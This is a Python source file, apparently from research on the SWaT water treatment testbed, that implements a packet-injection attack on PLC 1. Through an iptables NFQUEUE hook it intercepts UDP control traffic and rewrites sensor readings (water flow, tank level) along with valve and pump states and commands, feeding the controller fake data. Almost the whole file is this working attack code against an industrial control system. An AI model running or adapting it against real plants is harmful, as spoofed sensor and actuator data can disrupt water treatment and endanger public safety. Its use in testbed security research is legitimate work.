#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to inject fake data in all actuators and sensors of PLC 1.
"""
from __future__ import print_function

import datetime
import os
import sys
from netfilterqueue import NetfilterQueue

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from swat.plc1 import SWAT_P1_RIO_AI, SWAT_P1_RIO_DI, SWAT_P1_RIO_DO
from swat.scaling import current_to_signal, signal_to_current, P1Level, P1Flow

# Parameters list
_pump1_in = True  # True is on, False is off
_pump1_out = True  # True is on, False is off
_pump2_in = True  # True is on, False is off
_pump2_out = True  # True is on, False is off
_valve_in = True  # True is open, False is close
_valve_out = True  # True is open, False is close
_flow_in = 0
_level_in = 0


def __inject(packet):
    pkt = IP(packet.get_payload())
    if SWAT_P1_RIO_AI in pkt:
        pkt[SWAT_P1_RIO_AI].level = _level_in
        pkt[SWAT_P1_RIO_AI].flow = _flow_in
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    if SWAT_P1_RIO_DI in pkt:
        pkt[SWAT_P1_RIO_DI].valve_close = 0 if _valve_in else 1
        pkt[SWAT_P1_RIO_DI].valve_open = 1 if _valve_in else 0
        pkt[SWAT_P1_RIO_DI].pump1_run = 1 if _pump1_in else 0
        pkt[SWAT_P1_RIO_DI].pump2_run = 1 if _pump2_in else 0
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    if SWAT_P1_RIO_DO in pkt:
        if pkt[SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
            pkt[SWAT_P1_RIO_DO].valve_close = 0 if _valve_out else 1
            pkt[SWAT_P1_RIO_DO].valve_open = 1 if _valve_out else 0
            pkt[SWAT_P1_RIO_DO].pump1_start = 1 if _pump1_out else 0
            pkt[SWAT_P1_RIO_DO].pump2_start = 1 if _pump2_out else 0
            del pkt[UDP].chksum  # Need to recompute checksum
            packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    try:
        print(datetime.datetime.now())
        print("[*] starting valve spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping valve spoofing")
        print(datetime.datetime.now())
        nfqueue.unbind()
    return 1


def configure():
    global _valve_in, _pump1_in, _pump2_in
    valve = input('Set valve state Open(1) or Close(0):')
    _valve_in = True if valve else False
    pump1 = input('Set pump1 state On(1) or Off(0):')
    _pump1_in = True if pump1 else False
    pump2 = input('Set pump2 state On(1) or Off(0):')
    _pump2_in = True if pump2 else False
    global _valve_out, _pump1_out, _pump2_out
    valve = input('Set valve control Open(1) or Close(0):')
    _valve_out = True if valve else False
    pump1 = input('Set pump1 control On(1) or Off(0):')
    _pump1_out = True if pump1 else False
    pump2 = input('Set pump2 control On(1) or Off(0):')
    _pump2_out = True if pump2 else False
    global _flow_in, _level_in
    sflow = input('Set water flow (m^2/h): ')
    _flow_in = signal_to_current(sflow, P1Flow)
    slevel = input('Set water level (mm): ')
    _level_in = signal_to_current(slevel, P1Level)
    params()


def params():
    state = 'Open' if _valve_in else 'Close'
    value = 1 if _valve_in else 0
    print('Valve state: {} ({})'.format(state, value))
    state = 'Open' if _valve_out else 'Close'
    value = 1 if _valve_out else 0
    print('Valve control: {} ({})'.format(state, value))
    state = 'On' if _pump1_in else 'Off'
    value = 1 if _pump1_in else 0
    print('Pump1 state: {} ({})'.format(state, value))
    state = 'On' if _pump1_out else 'Off'
    value = 1 if _pump1_out else 0
    print('Pump1 control: {} ({})'.format(state, value))
    state = 'Open' if _pump2_in else 'Off'
    value = 1 if _pump2_in else 0
    print('Pump2 state: {} ({})'.format(state, value))
    state = 'On' if _pump2_out else 'Off'
    value = 1 if _pump2_out else 0
    print('Pump2 control: {} ({})'.format(state, value))
    sflow = current_to_signal(_flow_in, P1Flow)
    print('Flow: {} m^2/h ({})'.format(sflow, _flow_in))
    slevel = current_to_signal(_level_in, P1Level)
    print('Level: {} mm ({})'.format(slevel, _level_in))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -F')


if __name__ == '__main__':
    sys.exit(start())
